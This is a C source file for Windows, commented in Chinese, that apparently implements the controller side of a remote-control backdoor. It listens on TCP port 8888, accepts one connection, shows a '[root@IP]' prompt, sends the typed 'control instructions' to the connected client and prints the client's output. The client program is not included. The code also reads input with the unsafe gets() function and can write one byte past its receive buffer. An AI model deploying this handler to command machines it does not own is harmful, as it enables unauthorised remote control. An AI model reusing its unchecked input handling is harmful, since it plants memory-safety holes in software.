
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib,"WS2_32.lib")


int main(int argc, char* argv[])
{
	WSADATA wsaData;
	SOCKET s, client;
	SOCKADDR_IN sin, remoteAddr;
	int nAddrLen;
	char szIP[16];
	char szCmd[64];        //控制指令缓冲区
	char szBuff[1024*8];   //反馈信息缓冲区
	int nSend, nRecv;
	
	//初始化WS2_32.dll
	WORD sockVersion = MAKEWORD(2, 0);
	WSAStartup(sockVersion, &wsaData);
	
	//创建套接字
	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(s == INVALID_SOCKET)
	{
		printf("Failed socket() \n");
		WSACleanup();
		return 0;
	}
	
	//填充sockaddr_in结构
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8888);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	
	//绑定这个套节字到一个本地地址
	if(bind(s, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("Failed bind() \n");
		WSACleanup();
		return 0;
	}
	
	//进入监听模式
	if(listen(s, 2) == SOCKET_ERROR)
	{
		printf("Failed listen()");
		WSACleanup();
		return 0;
	}
	
	//接受客户端连接
	nAddrLen = sizeof(remoteAddr);
	client = accept(s, (SOCKADDR*)&remoteAddr, &nAddrLen);
	if(client == INVALID_SOCKET)
	{
		printf("Failed accept()");
	}
	printf(">A Connection Accepted:\n>IP:%s Port:%d\r\n", 
		inet_ntoa(remoteAddr.sin_addr), remoteAddr.sin_port);
	sprintf(szIP, "%s", inet_ntoa(remoteAddr.sin_addr));
	
	//循环向客户端发送控制指令
	while(1)
	{
		//初始化缓冲区
		memset(szCmd, 0, sizeof(szCmd));
		memset(szBuff, 0, sizeof(szBuff));
		
		//用户输入控制指令
		printf("[root@%s]: ", szIP);
		gets(szCmd);
		
		//向客户端发送控制指令
		nSend = send(client, szCmd, strlen(szCmd), 0);
		
		//接收并显示来自客户端的反馈信息
		nRecv = recv(client, szBuff, sizeof(szBuff), 0);
		if(nRecv == SOCKET_ERROR)
		{
			MessageBox(NULL, "Client has been shut down", "Error", MB_OK);
			break;
		}
		if(nRecv > 0)
		{
			szBuff[nRecv] = '\0';
			printf("%s\n", szBuff);
		}
	}
	
	//关闭同客户端的连接
	closesocket(client);
	
	//关闭监听套节字
	closesocket(s);
	//释放WS2_32库
	WSACleanup();	
	
	return 0;
}